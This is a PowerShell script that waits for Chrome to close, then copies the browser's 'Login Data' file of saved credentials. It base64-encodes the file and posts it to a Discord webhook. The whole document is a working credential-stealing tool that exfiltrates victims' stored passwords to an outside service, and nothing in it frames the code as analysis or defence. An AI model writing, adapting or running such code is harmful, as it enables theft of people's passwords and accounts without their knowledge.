# Full script with wait for Chrome close and debug info

# Your Discord webhook URL here
$webhookUrl = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'

# Path to Chrome's Login Data file
$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

function Wait-ForChromeToClose {
    while ($true) {
        $chromeProcs = Get-Process -Name chrome -ErrorAction SilentlyContinue
        if ($chromeProcs) {
            Write-Host "Chrome processes running:"
            foreach ($proc in $chromeProcs) {
                Write-Host "PID: $($proc.Id), ProcessName: $($proc.ProcessName)"
            }
            Write-Host "Waiting for Chrome to close..."
            Start-Sleep -Seconds 3
        }
        else {
            Write-Host "No Chrome process found, proceeding..."
            break
        }
    }
}

# Wait until Chrome is fully closed
Wait-ForChromeToClose

try {
    # Read file bytes
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    # Convert to Base64 string
    $fileBase64 = [Convert]::ToBase64String($fileBytes)
}
catch {
    Write-Host "Failed to read file or convert to base64: $_"
    $fileBase64 = ''
}

if (-not [string]::IsNullOrEmpty($fileBase64)) {
    $payload = @{
        content = "Base64 preview sent to Discord webhook.`nBase64 Data:`n``````n$fileBase64`n``````"
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
        Write-Host "File content sent to Discord webhook."
    }
    catch {
        Write-Host "Failed to send data to Discord webhook: $_"
    }
}
else {
    Write-Host "No data to send."
}
